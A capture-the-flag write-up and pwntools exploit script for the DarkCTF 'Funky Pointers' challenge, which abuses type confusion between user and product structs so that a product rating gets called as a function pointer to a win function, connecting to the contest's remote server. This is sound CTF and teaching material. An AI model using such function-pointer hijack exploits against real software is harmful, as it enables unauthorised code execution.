"""
DarkCTF `Funky Pointers` Writeup
Pwn

Presents as a heap challenge, but ends up being a more straightforward case of 
type confusion -> ret2win

User Struct: 

typedef void (*RatingFunction)(product* product, unsigned int rating);
struct user {
    char[128] user_name;
    RatingFunction rateProduct;
}

Product Struct:

struct product {
    char[128] product_name;
    unsigned int rating;
}

Both are stored in the same array, and the search functions in the binary is not able to
distinguish between them. This allows us to treat the rating field of a product as a
function pointer. There is a `flag` function and the binary isn't PIE, so we know it's
address.

Steps are as follows:
1) Create user and product
2) Set rating of product to offset of `flag` function
3) Call rate product, this time using the name of the product as the username. This will cause the
   rating field to be treated like a function and called
"""

from pwn import *

binary_path = "./pwn1"
lib_path = "/lib/x86_64-linux-gnu/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")


gs="""

contextwatch execute "vis"

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
    .above(of="main", display="expressions", size="75%")
    .left(of="expressions", display="regs", size="35%")
    .above(of="regs", display="disasm")
    .above(of="disasm", display="stack")
).build(nobanner=True)
end

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        return remote("pwn1.darkarmy.xyz", 7001)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def register_user(username):
    io.sendline("1")
    io.recvuntil("User: ")
    io.sendline(username)

    io.recvuntil("choice:")
    io.clean()


def register_product(productname):
    io.sendline("2")
    io.recvuntil("Product: ")
    io.sendline(productname)

    io.recvuntil("choice:")
    io.clean()


def rate_product(username, productname, rating):
    io.sendline("3")
    
    io.recvuntil("User: ")
    io.sendline(username)
    
    io.recvuntil("Product: ")
    io.sendline(productname)
    
    io.recvuntil("Rating: ")
    io.sendline(f"{rating}")

    io.recvuntil("choice:")
    io.clean()


io = start()

register_user("user")
register_product("product")

rate_product("user", "product", elf.sym.flag)

rate_product("product", "user", 0)

io.interactive()

# darkCTF{7yp3_c0nfu510n_15_50_4wful}